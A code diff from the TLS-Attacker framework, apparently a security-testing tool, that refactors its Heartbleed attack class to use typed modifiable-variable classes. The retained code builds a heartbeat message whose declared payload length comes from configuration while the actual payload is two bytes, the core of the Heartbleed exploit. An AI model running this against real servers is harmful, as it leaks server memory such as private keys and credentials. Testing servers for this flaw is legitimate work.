@@ -19,15 +19,16 @@ package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.tlsattacker.tls.Attacker;
 import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
-import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariable;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
+import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
+import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
+import de.rub.nds.tlsattacker.modifiablevariable.singlebyte.ModifiableByte;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
 import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
 import de.rub.nds.tlsattacker.tls.protocol.heartbeat.messages.HeartbeatMessage;
 import de.rub.nds.tlsattacker.tls.protocol.constants.ProtocolMessageType;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
-import de.rub.nds.tlsattacker.tls.workflow.TlsContextAnalyzer;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.transport.TransportHandler;
@@ -56,10 +57,10 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
 
 	WorkflowTrace trace = tlsContext.getWorkflowTrace();
 
-	ModifiableVariable<Byte> heartbeatMessageType = new ModifiableVariable<>();
-	ModifiableVariable<Integer> payloadLength = new ModifiableVariable<>();
+	ModifiableByte heartbeatMessageType = new ModifiableByte();
+	ModifiableInteger payloadLength = new ModifiableInteger();
 	payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
-	ModifiableVariable<byte[]> payload = new ModifiableVariable<>();
+	ModifiableByteArray payload = new ModifiableByteArray();
 	payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
 	HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
 	hb.setHeartbeatMessageType(heartbeatMessageType);
